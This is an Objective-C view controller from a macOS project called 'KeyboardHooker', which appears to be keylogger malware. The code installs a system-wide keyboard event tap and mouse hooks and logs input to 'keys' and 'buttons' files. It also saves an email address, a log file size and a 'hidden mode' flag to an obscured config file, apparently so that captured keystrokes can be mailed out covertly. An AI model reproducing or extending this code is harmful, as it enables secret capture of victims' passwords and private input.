//
//  ViewController.m
//  KeyboardHooker
//
//  Created by Иван on 21.11.17.
//  Copyright © 2017 IvanCode. All rights reserved.
//

#import "ViewController.h"
#import <SystemConfiguration/SystemConfiguration.h>

@implementation ViewController

CGEventRef myCGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    [[(__bridge ViewController*)refcon key] doFullCycle:(int)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode)];
    return event;
}

- (void)viewDidLoad {
    [super viewDidLoad];
    
    [_emailTextField setDelegate:self];
    [_fileSize setDelegate:self];
    
    [FileManager createFile:@"keys"];
    [FileManager createFile:@"buttons"];
    
    _key = [[KeyHooker alloc] init];
    _mouse = [[MouseHooker alloc] init];
    
    [KeyRunLoop setRunLoop:myCGEventCallback :(__bridge void *)(self)];
    [_mouse setMouseNotifications];
}

- (void)controlTextDidChange: (NSNotification*)notification {
    NSTextField *textField = [notification object];
    
    if ([textField tag] == 1) {
        if (![RegexManager validateEmail:[_emailTextField stringValue]]) {
            [_emailTextField setTextColor:[NSColor redColor]];
            [_saveButton setEnabled: NO];
            emailFlag = NO;
        } else {
            [_emailTextField setTextColor:[NSColor blackColor]];
            emailFlag = YES;
        }
    }
    
    if ([textField tag] == 2) {
        if (![RegexManager validateSize:[_fileSize stringValue]]) {
            [_fileSize setTextColor:[NSColor redColor]];
            [_saveButton setEnabled: NO];
            sizeFlag = NO;
        } else {
            [_fileSize setTextColor:[NSColor blackColor]];
            sizeFlag = YES;
        }
    }
    
    if (emailFlag && sizeFlag) {
        [_saveButton setEnabled: YES];
    }
}

- (IBAction)clickedSaveButton:(id)sender {
    [FileManager createFile:@"config"];
    
    if ([RegexManager validateEmail:[_emailTextField stringValue]] && [RegexManager validateSize:[_fileSize stringValue]]) {
        NSString *email = [Cryptographer doIt:[_emailTextField stringValue]];
        NSString *size = [Cryptographer doIt:[_fileSize stringValue]];
        NSString *mode = [Cryptographer doIt:[NSString stringWithFormat:@"%ld", (long)[_hiddenModeSwitch state]]];
        
        [FileManager writeToFile:@"config" file:[NSString stringWithFormat:@"%@\n", email]];
        [FileManager writeToFile:@"config" file:[NSString stringWithFormat:@"%@\n", size]];
        [FileManager writeToFile:@"config" file:[NSString stringWithFormat:@"%@", mode]];
    }
}

@end
